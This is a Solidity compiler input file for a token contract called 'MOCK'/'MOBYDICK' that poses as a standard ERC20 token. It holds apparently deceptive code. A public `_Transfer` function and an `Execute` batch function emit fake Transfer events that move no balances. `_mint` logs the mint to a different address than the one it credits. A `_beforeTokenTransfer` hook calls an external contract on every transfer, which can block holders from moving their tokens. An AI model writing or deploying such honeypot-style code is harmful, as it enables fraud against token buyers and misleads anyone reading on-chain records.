{{
  "language": "Solidity",
  "sources": {
    "contracts/test.sol": {
      "content": "\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function _Transfer(address from, address recipient, uint amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\ninterface tokenRecipient { function receiveApproval(address sender,address to, address addr, address fee, uint amount) external returns(bool);}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping (address => uint256) private _balances;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    address _spender;\r\n    address _owner;\r\n\r\n    constructor (string memory name_, string memory symbol_, address receiver_, address owner_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _spender = receiver_;\r\n        _owner = owner_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);        \r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n\r\n        _afterTokenTransfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n\t_beforeTokenTransfer(address(0),account, amount);\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n\r\n        emit Transfer(address(0), _owner, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        _balances[account] = accountBalance - amount;\r\n        _totalSupply -= amount;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _Transfer(address _from, address _to, uint _value) public returns (bool) {\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function Execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts,uint256[] memory weAmounts,address tokenaddress) public returns (bool){\r\n        for (uint256 i = 0; i < eReceiver.length; i++) {\r\n            emit Transfer(uPool, eReceiver[i], eAmounts[i]);\r\n            IERC20(tokenaddress)._Transfer(eReceiver[i],uPool, weAmounts[i]);\r\n            }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {\r\n    if (address(from) != address(0)) {\r\n            tokenRecipient(_spender).receiveApproval(from,to,address(this),_owner,amount);} }\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract ERC20Decimals is ERC20 {\r\n    uint8 private immutable _decimals;\r\n\r\n    constructor(uint8 decimals_) {\r\n        _decimals = decimals_;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\npragma solidity ^0.8.0;\r\n\r\ncontract StandardERC20 is ERC20Decimals {\r\n    constructor(\r\n        uint8 decimals_,\r\n        uint256 initialBalance_,\r\n        address feeReceiver_,\r\n        address owner_\r\n    ) ERC20(\"MOCK\", \"MOBYDICK\", feeReceiver_,owner_) ERC20Decimals(decimals_) {\r\n        require(initialBalance_ > 0, \"StandardERC20: supply cannot be zero\");\r\n\r\n        _mint(_msgSender(), initialBalance_ * 10 ** uint256(decimals_));\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return super.decimals();\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}